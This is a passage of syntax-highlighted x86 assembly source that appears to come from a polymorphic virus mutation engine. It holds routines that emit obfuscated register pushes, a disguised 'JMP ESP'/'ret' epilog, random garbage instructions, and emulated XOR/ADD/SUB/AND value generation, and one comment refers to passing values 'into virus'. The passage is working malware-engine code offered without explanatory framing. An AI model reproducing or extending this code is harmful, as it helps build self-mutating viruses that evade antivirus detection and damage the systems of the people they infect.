</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; push 1 register</span><span class="sc0">
                        </span><span class="sc1">; (indexes stored in regbuf, count in ECX)</span><span class="sc0">

</span><span class="sc5">@@push_1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; decr. num of regs in regbuf</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc0">     </span><span class="sc1">; read 1 byte</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; delete 1st entry in regbuf</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regbuf</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">                   </span><span class="sc1">; just 8 bytes</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; mark register as free</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; add JMP</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">         </span><span class="sc1">; PUSH reg</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">      </span><span class="sc1">; "logic" command</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

                        </span><span class="sc1">; push all registers</span><span class="sc0">
                        </span><span class="sc1">; (indexes stored in regbuf, count in ECX)</span><span class="sc0">

</span><span class="sc5">@@push_all</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@push_all_done</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@push_1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@push_all</span><span class="sc0">
</span><span class="sc5">@@push_all_done</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">retn</span><span class="sc0">

                        </span><span class="sc1">; push registers up to pointed by EBX</span><span class="sc0">
                        </span><span class="sc1">; (indexes stored in regbuf, count in ECX)</span><span class="sc0">

</span><span class="sc5">@@push_uptoebx</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@ebx_free</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@push_1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@push_uptoebx</span><span class="sc0">
</span><span class="sc5">@@ebx_free</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">

                        </span><span class="sc1">; "epilog" code --</span><span class="sc0">
                        </span><span class="sc1">; -- load regs and JMP ESP in perverted form</span><span class="sc0">

</span><span class="sc5">@@epilog</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">      </span><span class="sc1">; "logic"</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@error1</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_free_reg</span><span class="sc0">  </span><span class="sc1">; get free rnd reg &lt;reg1&gt;</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; to avoid usage in logic;</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; value unknown (ESP)</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E089h</span><span class="sc0">      </span><span class="sc1">; mov reg1, esp</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_free_reg</span><span class="sc0">  </span><span class="sc1">; get free rnd &lt;reg2&gt;</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@morethan1reg</span><span class="sc0">

</span><span class="sc1">; if we have only 1 register</span><span class="sc0">

</span><span class="sc5">@@1reg</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">      </span><span class="sc1">; add reg1, i_entry</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i_entry</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc1">; cant emul - ESP unknown</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@1ornot</span><span class="sc0">

</span><span class="sc1">; if we have more than 1 register</span><span class="sc0">

</span><span class="sc5">@@morethan1reg</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; mark as used</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i_entry</span><span class="sc0">    </span><span class="sc1">; reg2 &lt;-- i_entry</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_value</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@skip_xchg</span><span class="sc0">
                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; free reg1</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">reginit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; invert register usage</span><span class="sc0">
</span><span class="sc5">@@skip_xchg</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C001h</span><span class="sc0">      </span><span class="sc1">; add reg1, reg2</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc1">; cant emul - ESP unknown</span><span class="sc0">
</span><span class="sc5">@@1ornot</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc1">;; does reg1 value should be passed into virus?</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exitregptr</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@skipchk</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@push_ret</span><span class="sc0">
</span><span class="sc5">@@skipchk</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@jmp</span><span class="sc0">

</span><span class="sc5">@@push_ret</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;push</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; free reg1</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@epilog_regs</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">            </span><span class="sc1">;ret</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@lwo</span><span class="sc0">

</span><span class="sc5">@@jmp</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@epilog_regs</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0FFh</span><span class="sc0">      </span><span class="sc1">; JMP &lt;reg1&gt;</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; free reg1</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">@@lwo</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@multi_garbage</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc1">; @@epilog</span><span class="sc0">

</span><span class="sc5">@@epilog_regs</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">exitregptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@er_ret</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">@@er_cycle</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@er_cont</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exitregptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@er_cont</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_value</span><span class="sc0">     </span><span class="sc1">; em_reg[ebx*4] &lt;-- edx</span><span class="sc0">

                        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regused</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">

</span><span class="sc5">@@er_cont</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@@er_cycle</span><span class="sc0">

</span><span class="sc5">@@er_ret</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@multi_garbage</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@mg_ret</span><span class="sc0">
</span><span class="sc5">@@gen_garbage</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@poly_cmd</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@gen_garbage</span><span class="sc0">
</span><span class="sc5">@@mg_ret</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">

                        </span><span class="sc1">; this subroutine makes em_reg[EBX] equal to EDX</span><span class="sc0">

</span><span class="sc5">@@gen_value</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; use XOR if noone specified</span><span class="sc0">
                        </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XOR</span><span class="sc4">+</span><span class="sc5">CMD_ADD</span><span class="sc4">+</span><span class="sc5">CMD_SUB</span><span class="sc4">+</span><span class="sc5">CMD_AND</span><span class="sc4">+</span><span class="sc5">CMD_OR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@rdef</span><span class="sc0">

</span><span class="sc5">@@gen_value_restart</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; EAX=#</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">

                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@r0</span><span class="sc0">            </span><span class="sc1">; dispatch</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@r1</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; and</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@r3</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; or</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@r4</span><span class="sc0">

</span><span class="sc5">@@r2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_XOR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@gen_value_restart</span><span class="sc0">
</span><span class="sc5">@@rdef</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; emul -- xor reg, c</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35F081h</span><span class="sc0">            </span><span class="sc1">; opcodes</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@store_cmd</span><span class="sc0">

</span><span class="sc5">@@r1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_ADD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@gen_value_restart</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; emul -- add reg, c</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05C081h</span><span class="sc0">            </span><span class="sc1">; opcodes</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@store_cmd</span><span class="sc0">

</span><span class="sc5">@@r0</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_SUB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@gen_value_restart</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; emul -- sub reg, c</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2dE881h</span><span class="sc0">            </span><span class="sc1">; opcodes</span><span class="sc0">

</span><span class="sc5">@@store_cmd</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; skip zero-argument</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@rt</span><span class="sc0">
</span><span class="sc5">@@store_cmd_even0</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOSHORT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@long</span><span class="sc0">   </span><span class="sc1">; if skip short opcs</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; use short form for EAX</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@long</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">@@short</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; store 1-byte opcode</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@shortorlong</span><span class="sc0">

</span><span class="sc5">@@long</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">; store 2-byte opcode</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">@@shortorlong</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; store argument (EDX)</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">@@rt</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@r3</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">testcmd</span><span class="sc0"> </span><span class="sc5">CMD_AND</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@gen_value_restart</span><span class="sc0">

                        </span><span class="sc1">; em_reg and ? = edx</span><span class="sc0">
                        </span><span class="sc1">; 0          *    0</span><span class="sc0">
                        </span><span class="sc1">; 0          -    1</span><span class="sc0">
                        </span><span class="sc1">; 1          0    0</span><span class="sc0">
                        </span><span class="sc1">; 1          1    1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; em_reg and ? = edx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; 0         none 1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@gen_value_restart</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@random_dword</span><span class="sc0">          </span><span class="sc1">; em_reg and ? = edx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; 0         any  0</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                                                        </span><span class="sc1">; em_reg and ? = edx</span><span class="sc0">
